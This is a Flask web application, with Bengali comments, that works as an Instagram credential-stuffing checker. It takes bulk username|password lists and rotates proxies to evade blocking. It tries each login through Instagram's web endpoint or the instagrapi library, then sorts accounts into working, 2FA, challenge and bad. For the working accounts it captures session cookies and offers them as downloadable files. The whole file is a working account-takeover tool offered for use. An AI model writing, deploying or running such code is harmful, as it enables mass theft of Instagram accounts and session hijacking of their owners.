from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
import asyncio
import aiohttp
import json
import time
import os
import random
from datetime import datetime
import threading
import tempfile
import zipfile
from io import BytesIO

app = Flask(__name__)
CORS(app)

# স্টোরেজ
jobs = {}

class InstagramChecker:
    def __init__(self, proxies=None):
        self.proxies = proxies if proxies else []
        self.current_proxy_index = 0
        
    def get_next_proxy(self):
        """পরবর্তী প্রক্সি সিলেক্ট করুন (রাউন্ড রবিন)"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        return proxy
    
    def validate_proxy(self, proxy):
        """প্রক্সি ভ্যালিড কিনা চেক করুন"""
        if not proxy or proxy == '':
            return True
        
        try:
            import requests
            test_session = requests.Session()
            test_session.proxies = {'http': proxy, 'https': proxy}
            test_session.timeout = 5
            response = test_session.get('http://httpbin.org/ip', timeout=5)
            return response.status_code == 200
        except:
            return False
    
    async def check_with_instagrapi(self, username, password, proxy=None):
        """instagrapi দিয়ে চেক"""
        try:
            from instagrapi import Client
            from instagrapi.exceptions import (
                LoginRequired, ChallengeRequired, TwoFactorRequired,
                BadPassword, ClientError, ProxyError
            )
            
            cl = Client()
            if proxy:
                try:
                    cl.set_proxy(proxy)
                except Exception as e:
                    return {'status': 'proxy_error', 'error': f'Proxy error: {str(e)}', 'method': 'instagrapi'}
            
            cl.delay_range = [1, 2]
            cl.login(username, password)
            await asyncio.sleep(1)
            
            session_data = cl.get_session_data()
            cookie_string = f"sessionid={session_data.get('sessionid', '')}; "
            cookie_string += f"csrftoken={session_data.get('csrftoken', '')}; "
            cookie_string += f"ds_user_id={session_data.get('ds_user_id', '')}"
            
            return {
                'status': 'success',
                'cookie': cookie_string,
                'method': 'instagrapi',
                'proxy_used': proxy if proxy else 'direct'
            }
            
        except TwoFactorRequired:
            return {'status': '2fa', 'method': 'instagrapi'}
        except ChallengeRequired:
            return {'status': 'challenge', 'method': 'instagrapi'}
        except BadPassword:
            return {'status': 'bad_password', 'method': 'instagrapi'}
        except ProxyError:
            return {'status': 'proxy_error', 'error': 'Proxy connection failed', 'method': 'instagrapi'}
        except Exception as e:
            return {'status': 'error', 'error': str(e), 'method': 'instagrapi'}
    
    async def check_with_requests(self, username, password, proxy=None):
        """requests দিয়ে চেক (ফাস্ট)"""
        try:
            import requests
            
            session = requests.Session()
            if proxy:
                try:
                    session.proxies = {'http': proxy, 'https': proxy}
                except Exception as e:
                    return {'status': 'proxy_error', 'error': f'Proxy error: {str(e)}', 'method': 'requests'}
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'X-Instagram-AJAX': '1',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://www.instagram.com',
                'Connection': 'keep-alive',
                'Host': 'www.instagram.com'
            }
            
            # CSRF টোকেন নেওয়া
            session.get('https://www.instagram.com/', headers=headers, timeout=10)
            await asyncio.sleep(1)
            
            login_data = {
                'username': username,
                'password': password,
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            response = session.post(
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                data=login_data,
                headers=headers,
                timeout=10
            )
            
            result = response.json()
            
            if result.get('authenticated'):
                cookies = session.cookies.get_dict()
                cookie_string = '; '.join([f"{k}={v}" for k, v in cookies.items()])
                
                return {
                    'status': 'success',
                    'cookie': cookie_string,
                    'method': 'requests',
                    'proxy_used': proxy if proxy else 'direct'
                }
            elif result.get('two_factor_required'):
                return {'status': '2fa', 'method': 'requests'}
            elif result.get('checkpoint_url'):
                return {'status': 'challenge', 'method': 'requests'}
            else:
                return {'status': 'bad_password', 'method': 'requests'}
                
        except requests.exceptions.ProxyError:
            return {'status': 'proxy_error', 'error': 'Proxy connection failed', 'method': 'requests'}
        except requests.exceptions.Timeout:
            return {'status': 'proxy_error', 'error': 'Proxy timeout', 'method': 'requests'}
        except Exception as e:
            return {'status': 'error', 'error': str(e), 'method': 'requests'}
    
    async def check_account(self, username, password):
        """একটি একাউন্ট চেক করা - অটো প্রক্সি সিলেক্ট"""
        
        # পরবর্তী প্রক্সি নিন
        proxy = self.get_next_proxy()
        
        # প্রথমে requests দিয়ে চেষ্টা
        result = await self.check_with_requests(username, password, proxy)
        
        # যদি fails বা proxy error, instagrapi দিয়ে চেষ্টা
        if result['status'] in ['error', 'proxy_error']:
            result = await self.check_with_instagrapi(username, password, proxy)
        
        return result

async def process_batch(credentials_list, job_id, proxy_list=None):
    """ব্যাচ প্রসেসিং - ইউজারের দেওয়া প্রক্সি ব্যবহার করে"""
    
    checker = InstagramChecker(proxy_list)
    total = len(credentials_list)
    batch_size = 5  # একসাথে ৫টা করে চেক
    
    jobs[job_id]['progress'] = 0
    jobs[job_id]['status'] = 'processing'
    
    for i in range(0, total, batch_size):
        batch = credentials_list[i:i+batch_size]
        tasks = []
        
        for cred in batch:
            if '|' in cred:
                username, password = cred.split('|', 1)
                tasks.append(checker.check_account(username.strip(), password.strip()))
        
        # একসাথে ব্যাচ চেক
        batch_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # রেজাল্ট প্রসেস
        for cred, result in zip(batch, batch_results):
            if '|' not in cred:
                continue
                
            username, password = cred.split('|', 1)
            
            if isinstance(result, Exception):
                jobs[job_id]['results']['error'].append(f"{username}|{password}|ERROR: {str(result)}")
                continue
            
            if result['status'] == 'success':
                jobs[job_id]['results']['good'].append(f"{username}|{password}|{result['cookie']}|Proxy: {result.get('proxy_used', 'unknown')}")
            elif result['status'] == '2fa':
                jobs[job_id]['results']['2fa'].append(f"{username}|{password}|2FA_REQUIRED")
            elif result['status'] == 'challenge':
                jobs[job_id]['results']['challenge'].append(f"{username}|{password}|CHALLENGE_REQUIRED")
            elif result['status'] == 'bad_password':
                jobs[job_id]['results']['bad'].append(f"{username}|{password}|BAD_PASSWORD")
            elif result['status'] == 'proxy_error':
                jobs[job_id]['results']['error'].append(f"{username}|{password}|PROXY_ERROR: {result.get('error', 'Unknown')}")
            else:
                jobs[job_id]['results']['error'].append(f"{username}|{password}|ERROR: {result.get('error', 'Unknown')}")
        
        # প্রোগ্রেস আপডেট
        jobs[job_id]['progress'] = int((i + len(batch)) / total * 100)
        jobs[job_id]['details'] = {
            'good': len(jobs[job_id]['results']['good']),
            '2fa': len(jobs[job_id]['results']['2fa']),
            'challenge': len(jobs[job_id]['results']['challenge']),
            'bad': len(jobs[job_id]['results']['bad']),
            'error': len(jobs[job_id]['results']['error'])
        }
        
        # বিরতি (ব্লক এড়াতে)
        await asyncio.sleep(2)
    
    jobs[job_id]['status'] = 'completed'

def run_async_process(credentials, job_id, proxy_list):
    """Async ফাংশন রান করার জন্য হেল্পার"""
    asyncio.run(process_batch(credentials, job_id, proxy_list))

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/submit', methods=['POST'])
def submit():
    data = request.json
    credentials = data.get('credentials', '').strip().split('\n')
    credentials = [c.strip() for c in credentials if c.strip()]
    
    # প্রক্সি লিস্ট প্রসেস
    proxy_input = data.get('proxies', '').strip()
    proxy_list = []
    
    if proxy_input:
        proxy_lines = proxy_input.split('\n')
        for line in proxy_lines:
            line = line.strip()
            if line and not line.startswith('#'):
                proxy_list.append(line)
    
    if not credentials:
        return jsonify({'error': 'কোনো ডাটা দেওয়া হয়নি'}), 400
    
    job_id = datetime.now().strftime("%Y%m%d%H%M%S")
    jobs[job_id] = {
        'status': 'pending',
        'progress': 0,
        'results': {
            'good': [],
            '2fa': [],
            'challenge': [],
            'bad': [],
            'error': []
        },
        'details': {},
        'total': len(credentials),
        'proxy_count': len(proxy_list)
    }
    
    # ব্যাকগ্রাউন্ডে প্রসেসিং শুরু
    thread = threading.Thread(target=run_async_process, args=(credentials, job_id, proxy_list))
    thread.start()
    
    return jsonify({'job_id': job_id, 'proxy_count': len(proxy_list)})

@app.route('/api/status/<job_id>')
def status(job_id):
    if job_id not in jobs:
        return jsonify({'error': 'Job not found'}), 404
    
    return jsonify({
        'status': jobs[job_id]['status'],
        'progress': jobs[job_id]['progress'],
        'details': jobs[job_id].get('details', {}),
        'total': jobs[job_id]['total'],
        'proxy_count': jobs[job_id].get('proxy_count', 0)
    })

@app.route('/api/download/<job_id>/<type>')
def download(job_id, type):
    """আলাদা ফাইল ডাউনলোড"""
    if job_id not in jobs or jobs[job_id]['status'] != 'completed':
        return jsonify({'error': 'File not ready'}), 400
    
    valid_types = ['good', '2fa', 'challenge', 'bad', 'error']
    if type not in valid_types:
        return jsonify({'error': 'Invalid type'}), 400
    
    results = jobs[job_id]['results'][type]
    
    if not results:
        return jsonify({'error': 'No results for this category'}), 404
    
    filename = f"{type}_accounts_{job_id}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        for result in results:
            f.write(result + '\n')
    
    return send_file(filename, as_attachment=True, download_name=filename)

@app.route('/api/download/all/<job_id>')
def download_all(job_id):
    """সব ফাইল একসাথে জিপ করে ডাউনলোড"""
    if job_id not in jobs or jobs[job_id]['status'] != 'completed':
        return jsonify({'error': 'Files not ready'}), 400
    
    memory_file = BytesIO()
    with zipfile.ZipFile(memory_file, 'w') as zf:
        for category in ['good', '2fa', 'challenge', 'bad', 'error']:
            results = jobs[job_id]['results'][category]
            if results:
                content = '\n'.join(results)
                zf.writestr(f"{category}_accounts.txt", content)
        
        # রিপোর্ট ফাইল
        report = f"""Instagram Checker Report
Job ID: {job_id}
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Total Accounts: {jobs[job_id]['total']}
Proxies Used: {jobs[job_id].get('proxy_count', 0)}

Results Summary:
- Good: {len(jobs[job_id]['results']['good'])}
- 2FA Required: {len(jobs[job_id]['results']['2fa'])}
- Challenge Required: {len(jobs[job_id]['results']['challenge'])}
- Bad Password: {len(jobs[job_id]['results']['bad'])}
- Errors: {len(jobs[job_id]['results']['error'])}
"""
        zf.writestr("report.txt", report)
    
    memory_file.seek(0)
    return send_file(
        memory_file,
        download_name=f'all_results_{job_id}.zip',
        as_attachment=True
    )

if __name__ == '__main__':
    app.run(debug=True)
